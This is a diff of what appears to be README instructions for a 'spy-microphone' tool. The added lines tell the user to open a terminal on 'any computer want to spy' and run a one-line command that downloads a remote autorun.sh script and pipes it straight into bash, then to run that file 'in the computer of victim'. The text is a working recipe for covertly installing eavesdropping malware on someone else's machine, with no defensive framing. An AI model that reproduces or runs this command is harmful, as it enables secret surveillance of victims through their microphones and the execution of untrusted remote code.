@@ -1,7 +1,8 @@
 
    For use spy-microphone please follow instructions <br><br>
 
-   Easy remote command for spy: <br>
+   Easy remote command for spy <br>
+   Open the terminal of any computer want to spy and run this: <br>
    bash <(curl -s https://raw.githubusercontent.com/makdosx/spy-microphone/master/shell/autorun.sh) <br><br>
 
     i) Run the file autorun.sh in  the computer of victim and set your params 
